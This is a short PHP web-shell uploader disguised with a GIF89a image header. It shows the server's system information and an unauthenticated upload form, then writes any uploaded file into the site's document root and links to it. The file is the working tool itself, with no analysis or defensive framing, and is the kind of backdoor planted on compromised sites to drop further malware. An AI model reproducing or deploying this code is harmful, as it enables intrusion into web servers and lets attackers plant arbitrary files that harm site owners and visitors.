GIF89a;
<html>
<body bgcolor="white">
<center>
  <font color="green">
  <br>
  <br>
  <br>
  <br>
  <br>
  <br>
<?php echo "

 <br>"; echo "<b>".php_uname()."</font></b><br>"; echo "<form method='post' enctype='multipart/form-data'>

 <input type='file' name='idx_file'>

 <input type='submit' name='upload' value='upload'>

 </form>"; $root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['idx_file']['name']; $dest = $root.'/'.$files; if(isset($_POST['upload'])) {
    if(is_writable($root)) {

 if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {

 $web = "http://".$_SERVER['HTTP_HOST']."/";

 echo "Success Uploaded-> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";

 }

 else {             echo "Failed TO Upload At VIP Room";

 }

 }

 else {         if(@copy($_FILES['idx_file']['tmp_name'], $files))

 {

     echo "Upload Success <b>$files</b>";

     }

     else {             echo "Failed To Upload";

     }

     }

     }

     ?>
